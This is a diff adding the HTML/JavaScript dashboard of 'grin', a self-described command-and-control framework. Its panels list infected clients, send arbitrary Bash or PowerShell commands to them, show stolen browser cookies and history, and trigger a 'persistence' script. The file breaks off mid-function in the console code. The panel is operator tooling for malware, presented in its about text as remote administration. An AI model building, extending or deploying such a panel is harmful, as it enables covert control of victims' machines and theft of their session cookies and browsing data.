@@ -1,0 +1,1157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>grin Command Center</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="app-container" data-theme="light">
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <div class="logo">
+                    <img src="{{ url_for('static', filename='logo-icon.png') }}" alt="null Icon" class="logo-icon">
+                    <h2>grin - c2</h2>
+                </div>
+                <button class="toggle-sidebar" id="toggle-sidebar">
+                    <i class="fas fa-bars"></i>
+                </button>
+            </div>
+            
+            <nav class="sidebar-nav">
+                <div class="nav-container">
+                    <ul class="nav-list">
+                        <li class="nav-item active" data-section="dashboard">
+                            <div class="nav-icon">
+                                <i class="fas fa-chart-pie"></i>
+                            </div>
+                            <span>Dashboard</span>
+                        </li>
+                        <li class="nav-item" data-section="clients">
+                            <div class="nav-icon">
+                                <i class="fas fa-laptop"></i>
+                            </div>
+                            <span>Clients</span>
+                        </li>
+                        <li class="nav-item" data-section="scripts">
+                            <div class="nav-icon">
+                                <i class="fas fa-terminal"></i>
+                            </div>
+                            <span>Terminal</span>
+                        </li>
+                        <li class="nav-item" data-section="data">
+                            <div class="nav-icon">
+                                <i class="fas fa-database"></i>
+                            </div>
+                            <span>Data</span>
+                        </li>
+                        <li class="nav-item" data-section="analytics">
+                            <div class="nav-icon">
+                                <i class="fas fa-chart-line"></i>
+                            </div>
+                            <span>Analytics</span>
+                        </li>
+                        <li class="nav-item" data-section="console">
+                            <div class="nav-icon">
+                                <i class="fas fa-server"></i>
+                            </div>
+                            <span>Console</span>
+                        </li>
+                        <li class="nav-item" data-section="settings">
+                            <div class="nav-icon">
+                                <i class="fas fa-sliders-h"></i>
+                            </div>
+                            <span>Settings</span>
+                        </li>
+                        <li class="nav-item" data-section="about">
+                            <div class="nav-icon">
+                                <i class="fas fa-info-circle"></i>
+                            </div>
+                            <span>About</span>
+                        </li>
+                    </ul>
+                </div>
+            </nav>
+            
+            <div class="sidebar-footer">
+                <div class="user-profile">
+                    <div class="avatar">
+                        <i class="fas fa-user"></i>
+                    </div>
+                    <div class="user-info">
+                        <h4>Admin</h4>
+                        <p>Administrator</p>
+                    </div>
+                </div>
+            </div>
+        </aside>
+
+        <main class="main-content">
+            <header class="top-header">
+                <h4></h4>
+                <div class="header-search">
+                </div>
+                <div class="header-actions">
+                    <button class="action-btn" id="notifications-btn">
+                        <i class="fas fa-bell"></i>
+                        <span class="badge" id="notification-count">0</span>
+                    </button>
+                    <button class="action-btn" id="settings-btn">
+                        <i class="fas fa-cog"></i>
+                    </button>
+                </div>
+                <div class="notifications-dropdown" id="notifications-dropdown">
+                    <div class="notifications-header">
+                        <h3>Notifications</h3>
+                        <button class="clear-notifications" id="clear-notifications">Clear All</button>
+                    </div>
+                    <div class="notifications-list" id="notifications-list">
+                        <!-- Notifications will be populated here -->
+                    </div>
+                </div>
+            </header>
+
+            <section id="dashboard-section" class="content-section">
+                <h1 class="section-title">Dashboard Overview</h1>
+                
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-icon clients">
+                            <i class="fas fa-laptop"></i>
+                        </div>
+                        <div class="stat-info">
+                            <h3>Total Clients</h3>
+                            <p id="total-clients">0</p>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon active">
+                            <i class="fas fa-wifi"></i>
+                        </div>
+                        <div class="stat-info">
+                            <h3>Active Sessions</h3>
+                            <p id="active-sessions">0</p>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon pending">
+                            <i class="fas fa-tasks"></i>
+                        </div>
+                        <div class="stat-info">
+                            <h3>Pending Tasks</h3>
+                            <p id="pending-tasks">0</p>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon uptime">
+                            <i class="fas fa-clock"></i>
+                        </div>
+                        <div class="stat-info">
+                            <h3>Server Uptime</h3>
+                            <p id="server-uptime">N/A</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="activity-section">
+                    <h2>Recent Activity</h2>
+                    <div class="activity-list" id="activity-list">
+                        <!-- Recent activity will be populated here -->
+                    </div>
+                </div>
+            </section>
+
+            <section id="clients-section" class="content-section" style="display: none;">
+                <h1 class="section-title">Client Management</h1>
+                
+                <div class="client-filters">
+                    <div class="filter-group">
+                        <select id="status-filter">
+                            <option value="all">All Status</option>
+                            <option value="online">Online</option>
+                            <option value="offline">Offline</option>
+                        </select>
+                        <select id="os-filter">
+                            <option value="all">All OS</option>
+                            <option value="windows">Windows</option>
+                            <option value="macos">MacOS</option>
+                            <option value="linux">Linux</option>
+                        </select>
+                    </div>
+                    <button class="refresh-btn">
+                        <i class="fas fa-sync-alt"></i> Refresh
+                    </button>
+                </div>
+                
+                <div class="client-table-container">
+                    <table class="client-table">
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Client Name</th>
+                                <th>OS</th>
+                                <th>Status</th>
+                                <th>Last Active</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="client-table">
+                            <!-- Client data will be populated here -->
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+
+            <section id="scripts-section" class="content-section" style="display: none;">
+                <h1 class="section-title">Command Terminal</h1>
+                
+                <div class="terminal-controls">
+                    <div class="terminal-header">
+                        <div class="terminal-selects">
+                            <select id="client-select" class="terminal-select">
+                                <option value="">Select a client</option>
+                            </select>
+                            <select id="shell-select" class="terminal-select">
+                                <option value="bash">Bash</option>
+                                <option value="powershell">PowerShell</option>
+                            </select>
+                        </div>
+                        <div class="terminal-actions">
+                            <button onclick="runScript()" class="run-btn">
+                                <i class="fas fa-play"></i> Execute
+                            </button>
+                            <button onclick="clearOutput()" class="clear-btn">
+                                <i class="fas fa-trash"></i> Clear
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="terminal-interface">
+                        <div class="terminal-input-container">
+                            <textarea id="script-input" placeholder="Enter your command here..."></textarea>
+                        </div>
+                        <div class="terminal-output-container">
+                            <div class="terminal-output-header">
+                                <h3>Output</h3>
+                                <span id="output-status">Ready</span>
+                            </div>
+                            <div id="script-output" class="terminal-output"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="terminal-history">
+                        <h3>Command History</h3>
+                        <ul id="script-history-list"></ul>
+                    </div>
+                </div>
+            </section>
+
+            <section id="data-section" class="content-section" style="display: none;">
+                <h1 class="section-title">Browser Data</h1>
+                
+                <div class="data-container">
+                    <div class="data-controls">
+                        <select id="data-client-select">
+                            <option value="">Select a client</option>
+                        </select>
+                        <select id="browser-select">
+                            <option value="all">All Browsers</option>
+                            <option value="firefox">Firefox</option>
+                            <option value="chrome">Chrome</option>
+                            <option value="edge">Edge</option>
+                            <option value="chromium">Chromium</option>
+                        </select>
+                        <button class="refresh-btn" onclick="updateDataDisplay()">
+                            <i class="fas fa-sync-alt"></i> Refresh
+                        </button>
+                    </div>
+
+                    <div class="data-tabs">
+                        <button class="data-tab active" data-tab="cookies">Cookies</button>
+                        <button class="data-tab" data-tab="history">History</button>
+                    </div>
+
+                    <div class="data-content">
+                        <div id="cookies-content" class="tab-content active">
+                            <table class="data-table">
+                                <thead>
+                                    <tr>
+                                        <th>Host</th>
+                                        <th>Name</th>
+                                        <th>Value</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="cookies-table"></tbody>
+                            </table>
+                        </div>
+                        <div id="history-content" class="tab-content" style="display: none;">
+                            <table class="data-table">
+                                <thead>
+                                    <tr>
+                                        <th>URL</th>
+                                        <th>Title</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="history-table"></tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="analytics-section" class="content-section" style="display: none;">
+                <h1 class="section-title">Analytics</h1>
+                <div class="coming-soon">
+                    <i class="fas fa-chart-bar"></i>
+                    <h2>Analytics Dashboard Coming Soon</h2>
+                    <p>We're working on powerful analytics features to help you monitor and manage your clients more effectively.</p>
+                </div>
+            </section>
+
+            <section id="console-section" class="content-section" style="display: none;">
+                <h1 class="section-title">Server Console</h1>
+                
+                <div class="console-controls">
+                    <div class="console-interface">
+                        <div class="console-output-container">
+                            <div class="console-output-header">
+                                <h3>Server Output</h3>
+                                <span id="console-status">Ready</span>
+                            </div>
+                            <div id="console-output" class="console-output"></div>
+                        </div>
+                        <div class="console-input-container">
+                            <input type="text" id="console-input" placeholder="Enter server command...">
+                            <button onclick="executeConsoleCommand()" class="run-btn">
+                                <i class="fas fa-play"></i> Execute
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="settings-section" class="content-section" style="display: none;">
+                <h1 class="section-title">Settings</h1>
+                <div class="settings-container">
+                    <div class="settings-card">
+                        <h2>Appearance</h2>
+                        <div class="setting-item">
+                            <label>Theme</label>
+                            <div class="theme-switcher">
+                                <button class="theme-btn" data-theme="light">Light</button>
+                                <button class="theme-btn" data-theme="dark">Dark</button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="settings-card">
+                        <h2>General</h2>
+                        <div class="setting-item">
+                            <label>Refresh Interval</label>
+                            <select>
+                                <option value="1">1 second</option>
+                                <option value="2" selected>2 seconds</option>
+                                <option value="5">5 seconds</option>
+                                <option value="10">10 seconds</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="about-section" class="content-section" style="display: none;">
+                <h1 class="section-title">About  - grin</h1>
+                <div class="about-container">
+                    <h2>grin C2 Framework</h2>
+                    <p>grin is a sophisticated, web-based Command and Control (C2) framework engineered to facilitate seamless management and interaction with remote clients. Designed with a focus on efficiency and usability, grin empowers administrators with a modern, intuitive interface to monitor client statuses, execute commands, and analyze real-time activity data.</p>
+                    <p><strong>Core Features:</strong></p>
+                    <ul>
+                        <li>Real-time client monitoring with instant status updates</li>
+                        <li>Robust command execution supporting Bash and PowerShell environments</li>
+                        <li>Dynamic notification system and detailed activity logging</li>
+                        <li>Customizable interface with light and dark theme options</li>
+                    </ul>
+                    <p>Developed by <strong>nullvex</strong>, grin represents a commitment to delivering a reliable and scalable solution for remote system administration, tailored to meet the demands of managing distributed networks effectively.</p>
+                </div>
+                <div class="about-container-2">
+                    <h2>grin Console Commands</h2>
+                    <p>The grin console provides a powerful command-line interface for interacting with connected clients. Below is a list of available commands:</p>
+                    <ul>
+                        <li><strong>clear</strong>: Clears the console output</li>
+                        <li><strong>help</strong>: Displays a list of available commands</li>
+                        <li><strong>persistence <client-id></strong>: Executes a predefined persistence script on the specified client</li>
+                        <li><strong>list clients</strong>: Displays a formatted list of connected clients with their names and IDs</li>
+                        <li><strong>module <module> <client-id></strong>: Executes a module on the specified client (e.g., module sysinfo 956-519-238)</li>
+                    </ul>
+                    <p><strong>Available Modules:</strong></p>
+                    <ul>
+                        <li><strong>sysinfo</strong>: Retrieves system information from the client</li>
+                        <li><strong>disconnect</strong>: Disconnects the specified client</li>
+                    </ul>
+                    <hr>
+                    <p>For additional support or inquiries, please reach out via the contact options provided in the footer. grin is continuously evolving to meet the needs of its users, with new features and enhancements in development.</p>
+                </div>
+            </section>
+        </main>
+
+        <footer class="contact-footer">
+            <div class="contact-icons">
+                <a href="https://t.me/@nullkiss" target="_blank" class="contact-icon" title="Telegram">
+                    <i class="fab fa-telegram-plane"></i>
+                </a>
+                <a href="https://www.youtube.com/@eloblaze" target="_blank" class="contact-icon" title="YouTube">
+                    <i class="fab fa-youtube"></i>
+                </a>
+                <a href="https://github.com/nullkiss" target="_blank" class="contact-icon" title="GitHub">
+                    <i class="fab fa-github"></i>
+                </a>
+                <a href="https://messenger.com/placeholder" target="_blank" class="contact-icon" title="Messenger">
+                    <i class="fab fa-facebook-messenger"></i>
+                </a>
+            </div>
+        </footer>
+    </div>
+
+    <div id="notification-container"></div>
+
+    <!-- Disconnect Confirmation Popup -->
+    <div id="disconnect-popup" class="popup" style="display: none;">
+        <div class="popup-content">
+            <h3>Confirm Disconnect</h3>
+            <p>Would you like to continue disconnecting this client?</p>
+            <div class="popup-actions">
+                <button id="confirm-disconnect" class="popup-btn primary">Yes</button>
+                <button id="cancel-disconnect" class="popup-btn">No</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Client Info Popup -->
+    <div id="info-popup" class="popup" style="display: none;">
+        <div class="popup-content">
+            <h3>Client Information</h3>
+            <div id="info-content" class="info-content">
+                <p>Loading client information...</p>
+            </div>
+            <div class="popup-actions">
+                <button id="close-info" class="popup-btn">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Toggle sidebar with smooth transition
+        const toggleSidebarBtn = document.getElementById('toggle-sidebar');
+        toggleSidebarBtn.addEventListener('click', function() {
+            const appContainer = document.querySelector('.app-container');
+            appContainer.classList.toggle('sidebar-collapsed');
+        });
+
+        // Navigation
+        const navItems = document.querySelectorAll('.nav-item');
+        const sections = document.querySelectorAll('.content-section');
+
+        function switchSection(sectionId) {
+            navItems.forEach(i => i.classList.remove('active'));
+            const activeItem = Array.from(navItems).find(item => item.dataset.section === sectionId);
+            if (activeItem) activeItem.classList.add('active');
+
+            sections.forEach(section => {
+                section.style.display = section.id === `${sectionId}-section` ? 'block' : 'none';
+            });
+        }
+
+        navItems.forEach(item => {
+            item.addEventListener('click', () => switchSection(item.dataset.section));
+        });
+
+        document.getElementById('settings-btn').addEventListener('click', () => switchSection('settings'));
+
+        // Theme switcher
+        const themeButtons = document.querySelectorAll('.theme-btn');
+        const appContainer = document.querySelector('.app-container');
+        
+        themeButtons.forEach(btn => {
+            btn.addEventListener('click', () => {
+                const theme = btn.dataset.theme;
+                appContainer.dataset.theme = theme;
+                localStorage.setItem('theme', theme);
+                updateThemeButtons(theme);
+                document.body.style.backgroundColor = '';
+                document.body.offsetHeight;
+            });
+        });
+
+        function updateThemeButtons(activeTheme) {
+            themeButtons.forEach(btn => {
+                btn.classList.toggle('active', btn.dataset.theme === activeTheme);
+            });
+        }
+
+        const savedTheme = localStorage.getItem('theme') || 'light';
+        appContainer.dataset.theme = savedTheme;
+        updateThemeButtons(savedTheme);
+
+        // Notification system
+        let notifications = [];
+        const notificationsBtn = document.getElementById('notifications-btn');
+        const notificationsDropdown = document.getElementById('notifications-dropdown');
+        const notificationCount = document.getElementById('notification-count');
+        const notificationsList = document.getElementById('notifications-list');
+        const clearNotificationsBtn = document.getElementById('clear-notifications');
+
+        notificationsBtn.addEventListener('click', () => {
+            notificationsDropdown.classList.toggle('visible');
+            updateNotificationCount();
+        });
+
+        clearNotificationsBtn.addEventListener('click', () => {
+            notifications = [];
+            updateNotificationsList();
+            updateNotificationCount();
+        });
+
+        function showNotification(message, type = 'success') {
+            const timestamp = new Date().toLocaleTimeString();
+            const notification = { message, type, timestamp };
+            notifications.unshift(notification);
+            if (notifications.length > 10) notifications.pop();
+            
+            updateNotificationsList();
+            updateNotificationCount();
+
+            const container = document.getElementById('notification-container');
+            const notiEl = document.createElement('div');
+            notiEl.className = `notification ${type}`;
+            notiEl.innerHTML = `
+                <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
+                <span>${message}</span>
+            `;
+            container.appendChild(notiEl);
+            
+            setTimeout(() => {
+                notiEl.classList.add('fade-out');
+                setTimeout(() => notiEl.remove(), 500);
+            }, 3000);
+        }
+
+        function updateNotificationsList() {
+            notificationsList.innerHTML = notifications.length ? 
+                notifications.map(n => `
+                    <div class="notification-item ${n.type}">
+                        <i class="fas ${n.type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
+                        <div class="notification-content">
+                            <span>${n.message}</span>
+                            <span class="notification-time">${n.timestamp}</span>
+                        </div>
+                    </div>
+                `).join('') : 
+                '<div class="no-notifications">No notifications</div>';
+        }
+
+        function updateNotificationCount() {
+            const unreadCount = notifications.length;
+            notificationCount.textContent = unreadCount;
+            notificationCount.style.display = unreadCount > 0 ? 'flex' : 'none';
+        }
+
+        // Dashboard stats
+        function updateDashboardStats(total, active, pending) {
+            document.getElementById('total-clients').textContent = total || 0;
+            document.getElementById('active-sessions').textContent = active || 0;
+            document.getElementById('pending-tasks').textContent = pending || 0;
+            const uptimeEl = document.getElementById('server-uptime');
+            const startTime = performance.now();
+            setInterval(() => {
+                const elapsed = Math.floor((performance.now() - startTime) / 1000);
+                const hours = Math.floor(elapsed / 3600);
+                const minutes = Math.floor((elapsed % 3600) / 60);
+                uptimeEl.textContent = `${hours}h ${minutes}m`;
+            }, 60000);
+        }
+
+        // Recent activity
+        let recentActivities = [];
+        function updateRecentActivity(clients, previousClients) {
+            const activityList = document.getElementById('activity-list');
+            clients.forEach(client => {
+                const prevClient = previousClients?.find(c => c.id === client.id);
+                if (!prevClient || prevClient.status !== client.status) {
+                    const timestamp = new Date().toLocaleTimeString();
+                    if (client.status === "online" && (!prevClient || prevClient.status === "offline")) {
+                        recentActivities.unshift({
+                            type: 'connect',
+                            message: `New Client Connected`,
+                            details: `Client ID: ${client.id} - ${client.os || 'Unknown'}`,
+                            time: timestamp
+                        });
+                    } else if (client.status === "offline" && prevClient?.status === "online") {
+                        recentActivities.unshift({
+                            type: 'disconnect',
+                            message: `Client Disconnected`,
+                            details: `Client ID: ${client.id} - ${client.os || 'Unknown'}`,
+                            time: timestamp
+                        });
+                    }
+                }
+            });
+            if (recentActivities.length > 5) recentActivities = recentActivities.slice(0, 5);
+            activityList.innerHTML = recentActivities.map(activity => `
+                <div class="activity-item">
+                    <div class="activity-icon">
+                        <i class="fas fa-${activity.type === 'connect' ? 'user-plus' : 'user-minus'}"></i>
+                    </div>
+                    <div class="activity-details">
+                        <h4>${activity.message}</h4>
+                        <p>${activity.details}</p>
+                        <span class="activity-time">${activity.time}</span>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // Client list
+        function updateClientList(clients, previousClients) {
+            const tbody = document.getElementById('client-table');
+            if (clients && Array.isArray(clients)) {
+                updateRecentActivity(clients, previousClients);
+                clients.forEach(client => {
+                    const prevClient = previousClients?.find(c => c.id === client.id);
+                    if (!prevClient || prevClient.status !== client.status) {
+                        if (client.status === "online" && (!prevClient || prevClient.status === "offline")) {
+                            showNotification(`Client ${client.name} (${client.os || 'Unknown OS'}) connected`);
+                        } else if (client.status === "offline" && prevClient?.status === "online") {
+                            showNotification(`Client ${client.name} (${client.os || 'Unknown OS'}) disconnected`, 'error');
+                        }
+                    }
+                });
+                
+                tbody.innerHTML = '';
+                clients.forEach(client => {
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `
+                        <td>${client.id || 'N/A'}</td>
+                        <td>${client.name || 'Unknown'}</td>
+                        <td>${client.os || 'Unknown'}</td>
+                        <td><span class="status-badge ${client.status || 'unknown'}">${client.status || 'Unknown'}</span></td>
+                        <td>${client.lastActive || 'N/A'}</td>
+                        <td>
+                            <div class="action-buttons">
+                                <button class="action-btn primary" title="Connect"><i class="fas fa-link"></i></button>
+                                <button class="action-btn info" title="Info" onclick="showInfoPopup('${client.id}')"><i class="fas fa-info-circle"></i></button>
+                                <button class="action-btn danger" title="Disconnect" onclick="showDisconnectPopup('${client.id}')"><i class="fas fa-power-off"></i></button>
+                            </div>
+                        </td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+
+                updateClientSelect(clients);
+                updateDataClientSelect(clients);
+            }
+        }
+
+        // Popup Functions
+        function showDisconnectPopup(clientId) {
+            const popup = document.getElementById('disconnect-popup');
+            popup.style.display = 'flex';
+            
+            document.getElementById('confirm-disconnect').onclick = () => {
+                disconnectClient(clientId);
+                popup.style.display = 'none';
+            };
+            
+            document.getElementById('cancel-disconnect').onclick = () => {
+                popup.style.display = 'none';
+            };
+        }
+
+        function showInfoPopup(clientId) {
+            const popup = document.getElementById('info-popup');
+            const infoContent = document.getElementById('info-content');
+            infoContent.innerHTML = '<p>Loading client information...</p>';
+            popup.style.display = 'flex';
+            
+            fetchClientInfo(clientId);
+            
+            document.getElementById('close-info').onclick = () => {
+                popup.style.display = 'none';
+            };
+        }
+
+        function disconnectClient(clientId) {
+            fetch(`/api/run_script/${clientId}`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    shell: clientsData.find(c => c.id === clientId)?.os.includes('Windows') ? 'powershell' : 'bash',
+                    script: clientsData.find(c => c.id === clientId)?.os.includes('Windows') ? 'taskkill /F /IM python.exe' : 'pkill -f "python.*client.py"'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    showNotification(`Disconnect command sent to ${clientId}`);
+                    pollScriptResponse(data.request_id, document.getElementById('console-output'), document.getElementById('console-status'));
+                } else {
+                    showNotification(data.message, 'error');
+                }
+            })
+            .catch(error => {
+                showNotification('Error sending disconnect command', 'error');
+            });
+        }
+
+        function fetchClientInfo(clientId) {
+            const infoContent = document.getElementById('info-content');
+            fetch(`/api/run_script/${clientId}`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    shell: clientsData.find(c => c.id === clientId)?.os.includes('Windows') ? 'powershell' : 'bash',
+                    script: clientsData.find(c => c.id === clientId)?.os.includes('Windows') ? 'ipconfig && whoami' : 'ip a && whoami'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    pollScriptResponse(data.request_id, infoContent, null, true);
+                } else {
+                    infoContent.innerHTML = `<p>Error: ${data.message}</p>`;
+                }
+            })
+            .catch(error => {
+                infoContent.innerHTML = `<p>Error fetching info: ${error}</p>`;
+            });
+        }
+
+        function updateClientSelect(clients) {
+            const select = document.getElementById('client-select');
+            const currentValue = select.value;
+            select.innerHTML = '<option value="">Select a client</option>';
+            clients.filter(c => c.status === 'online').forEach(client => {
+                const option = document.createElement('option');
+                option.value = client.id;
+                option.textContent = `${client.name} (${client.id}) - ${client.os || 'Unknown'}`;
+                select.appendChild(option);
+            });
+            if (currentValue && clients.some(c => c.id === currentValue && c.status === 'online')) {
+                select.value = currentValue;
+            }
+        }
+
+        // Data section
+        function updateDataClientSelect(clients) {
+            const select = document.getElementById('data-client-select');
+            select.innerHTML = '<option value="">Select a client</option>';
+            clients.forEach(client => {
+                const option = document.createElement('option');
+                option.value = client.id;
+                option.textContent = `${client.name} (${client.id}) - ${client.os}`;
+                select.appendChild(option);
+            });
+        }
+
+        function updateDataDisplay() {
+            const clientId = document.getElementById('data-client-select').value;
+            const browser = document.getElementById('browser-select').value;
+            if (!clientId) {
+                showNotification('Please select a client', 'error');
+                return;
+            }
+
+            const client = clientsData.find(c => c.id === clientId);
+            if (!client || !client.browser_data) {
+                showNotification('No browser data available for this client', 'error');
+                return;
+            }
+
+            const cookiesTable = document.getElementById('cookies-table');
+            const historyTable = document.getElementById('history-table');
+            cookiesTable.innerHTML = '';
+            historyTable.innerHTML = '';
+
+            let cookies = [];
+            let history = [];
+
+            if (browser === 'all') {
+                Object.values(client.browser_data).forEach(data => {
+                    cookies = cookies.concat(data.cookies || []);
+                    history = history.concat(data.history || []);
+                });
+            } else {
+                cookies = client.browser_data[browser]?.cookies || [];
+                history = client.browser_data[browser]?.history || [];
+            }
+
+            cookies.forEach(cookie => {
+                const tr = document.createElement('tr');
+                const host = cookie.host || 'Unknown Host';
+                const hostContent = host.match(/^https?:\/\//) 
+                    ? `<a href="${host}" target="_blank">${host}</a>` 
+                    : host;
+                const name = cookie.name || 'Unknown Name';
+                const value = cookie.value || 'Unknown Value';
+                tr.innerHTML = `
+                    <td>${hostContent}</td>
+                    <td>${name}</td>
+                    <td>${value}</td>
+                `;
+                cookiesTable.appendChild(tr);
+            });
+
+            history.forEach(entry => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td><a href="${entry.url}" target="_blank">${entry.url}</a></td>
+                    <td>${entry.title || 'No title'}</td>
+                `;
+                historyTable.appendChild(tr);
+            });
+        }
+
+        // Script execution
+        function runScript() {
+            const clientId = document.getElementById('client-select').value;
+            const shell = document.getElementById('shell-select').value;
+            const script = document.getElementById('script-input').value.trim();
+            const output = document.getElementById('script-output');
+            const statusEl = document.getElementById('output-status');
+
+            if (!clientId) {
+                showNotification('Please select a client', 'error');
+                return;
+            }
+
+            if (!script) {
+                showNotification('Please enter a command', 'error');
+                return;
+            }
+
+            statusEl.textContent = 'Executing...';
+            statusEl.className = 'status-running';
+
+            fetch(`/api/run_script/${clientId}`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ shell, script })
+            })
+            .then(response => response.json())
+            .then(data => {
+                const timestamp = new Date().toLocaleTimeString();
+                output.innerHTML += `<div class="output-entry"><span class="timestamp">[${timestamp}]</span> ${data.message}</div>`;
+                if (data.status === 'success') {
+                    pollScriptResponse(data.request_id, output, statusEl);
+                    showNotification('Command executed successfully');
+                    addToScriptHistory(`${shell}: ${script}`);
+                    recentActivities.unshift({
+                        type: 'script',
+                        message: 'Script Executed',
+                        details: `Client ID: ${clientId} - Command: ${script}`,
+                        time: timestamp
+                    });
+                    if (recentActivities.length > 5) recentActivities.pop();
+                    updateRecentActivity(clientsData, clientsData);
+                } else {
+                    showNotification(data.message, 'error');
+                    statusEl.textContent = 'Completed';
+                    statusEl.className = 'status-error';
+                }
+                output.scrollTop = output.scrollHeight;
+            })
+            .catch(error => {
+                const timestamp = new Date().toLocaleTimeString();
+                showNotification('Error executing command', 'error');
+                output.innerHTML += `<div class="output-entry error"><span class="timestamp">[${timestamp}]</span> Error: ${error}</div>`;
+                output.scrollTop = output.scrollHeight;
+                statusEl.textContent = 'Error';
+                statusEl.className = 'status-error';
+            });
+        }
+
+        // Script history
+        function addToScriptHistory(script) {
+            const historyList = document.getElementById('script-history-list');
+            const li = document.createElement('li');
+            li.className = 'history-item';
+            li.innerHTML = `<span class="history-command">${script}</span><span class="history-time">${new Date().toLocaleTimeString()}</span>`;
+            li.onclick = () => {
+                const [shell, scriptText] = script.split(': ');
+                document.getElementById('shell-select').value = shell;
+                document.getElementById('script-input').value = scriptText;
+            };
+            historyList.insertBefore(li, historyList.firstChild);
+            while (historyList.children.length > 10) {
+                historyList.removeChild(historyList.lastChild);
+            }
+        }
+
+        // Clear output
+        function clearOutput() {
+            document.getElementById('script-output').innerHTML = '';
+            document.getElementById('output-status').textContent = 'Ready';
+            document.getElementById('output-status').className = '';
+        }
+
+        // Poll for script response
+        function pollScriptResponse(requestId, outputElement, statusElement, isInfoPopup = false) {
+            let attempts = 0;
+            const maxAttempts = 10; // Poll for up to 20 seconds (2s interval)
+            const pollInterval = setInterval(() => {
+                fetch(`/api/script_response/${requestId}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.status === 'success') {
+                            if (isInfoPopup) {
+                                outputElement.innerHTML = `<pre>${data.result}</pre>`;
+                            } else {
+                                const timestamp = new Date().toLocaleTimeString();
+                                outputElement.innerHTML += `<div class="output-entry"><span class="timestamp">[${timestamp}]</span> Response from ${data.client_id}:</div>`;
+                                outputElement.innerHTML += `<pre class="output-result">${data.result}</pre>`;
+                            }
+                            outputElement.scrollTop = outputElement.scrollHeight;
+                            if (statusElement) {
+                                statusElement.textContent = 'Completed';
+                                statusElement.className = 'status-success';
+                            }
+                            clearInterval(pollInterval);
+                        } else if (attempts >= maxAttempts) {
+                            if (isInfoPopup) {
+                                outputElement.innerHTML = '<p>No response received</p>';
+                            } else {
+                                outputElement.innerHTML += `<div class="output-entry error"><span class="timestamp">[${new Date().toLocaleTimeString()}]</span> No response received</div>`;
+                            }
+                            outputElement.scrollTop = outputElement.scrollHeight;
+                            if (statusElement) {
+                                statusElement.textContent = 'Timeout';
+                                statusElement.className = 'status-error';
+                            }
+                            clearInterval(pollInterval);
+                        }
+                        attempts++;
+                    })
+                    .catch(error => {
+                        console.error('Error polling script response:', error);
+                        if (isInfoPopup) {
+                            outputElement.innerHTML = `<p>Error: ${error}</p>`;
+                        }
+                        clearInterval(pollInterval);
+                    });
+            }, 2000);
+        }
+
+        // Console functionality
+        function executeConsoleCommand() {
+            const input = document.getElementById('console-input');
+            const command = input.value.trim();
+            const output = document.getElementById('console-output');
+            const statusEl = document.getElementById('console-status');
+            
+            if (!command) return;
+
+            const timestamp = new Date().toLocaleTimeString();
+            output.innerHTML += `<div class="output-entry"><span class="timestamp">[${timestamp}]</span> > ${command}</div>`;
+            
+            statusEl.textContent = 'Processing...';
+            statusEl.className = 'status-running';
+
+            if (command === 'clear') {
+                output.innerHTML = '';
+                statusEl.textContent = 'Ready';
+                statusEl.className = '';
+                showNotification('Console cleared');
+            } else if (command === 'help') {
+                const helpText = `
+                    Available commands:
+                    - clear: Clears the console output
+                    - help: Shows this help message
+                    - persistence <client-id>: Executes persistence script on specified client
+                    - list clients: Displays a list of connected clients
+                    - module <module> <client-id>: Executes a module on the specified client
+                        Available modules:
+                        - sysinfo: Retrieves system information
+                        - disconnect: Disconnects the client
+                `;
+                output.innerHTML += `<pre class="output-result">${helpText}</pre>`;
+                statusEl.textContent = 'Ready';
+                statusEl.className = '';
+            } else if (command.startsWith('persistence ')) {
+                const clientId = command.split(' ')[1];
+                if (!clientId || !clientId.match(/\d{3}-\d{3}-\d{3}/)) {
+                    output.innerHTML += `<div class="output-entry error"><span class="timestamp">[${timestamp}]</span> Invalid client ID format</div>`;
+                    statusEl.textContent = 'Error';
+                    statusEl.className = 'status-error';
+                    showNotification('Invalid client ID format', 'error');
+                } else {
+                    fetch(`/api/run_persistence/${clientId}`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' }
+                    })
+                    .then(response => response.json())
+                    .then(data => {
